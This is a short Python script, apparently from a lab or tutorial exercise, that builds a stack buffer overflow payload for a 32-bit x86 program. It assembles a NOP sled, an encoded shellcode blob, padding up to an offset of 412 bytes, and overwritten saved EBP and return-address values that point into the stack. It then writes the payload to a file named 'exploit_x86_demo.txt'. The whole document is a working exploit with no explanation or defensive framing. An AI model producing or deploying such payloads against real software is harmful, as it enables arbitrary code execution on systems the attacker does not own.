import struct

offset = 416-4

buf =  b""
buf += b"\x90"*208
buf += b"\xdd\xc1\xd9\x74\x24\xf4\x5b\xbe\x2f\x47\x69\x37\x2b"
buf += b"\xc9\xb1\x12\x31\x73\x17\x83\xeb\xfc\x03\x5c\x54\x8b"
buf += b"\xc2\x93\x81\xbc\xce\x80\x76\x10\x7b\x24\xf0\x77\xcb"
buf += b"\x4e\xcf\xf8\xbf\xd7\x7f\xc7\x72\x67\x36\x41\x74\x0f"
buf += b"\x09\x19\xbe\xaa\xe1\x58\xbf\x35\x49\xd5\x5e\x85\xcb"
buf += b"\xb6\xf1\xb6\xa0\x34\x7b\xd9\x0a\xba\x29\x71\xfb\x94"
buf += b"\xbe\xe9\x6b\xc4\x6f\x8b\x02\x93\x93\x19\x86\x2a\xb2"
buf += b"\x2d\x23\xe0\xb5"


eip_num = 0xffffd2fc
ebp_num = eip_num-200

ebp = struct.pack("<L", ebp_num)

eip = struct.pack("<L", eip_num)

buf+= b"\x90"*(offset-len(buf))

buf+=ebp
buf+=eip

f=open('exploit_x86_demo.txt','wb')

f.write(buf)
f.close()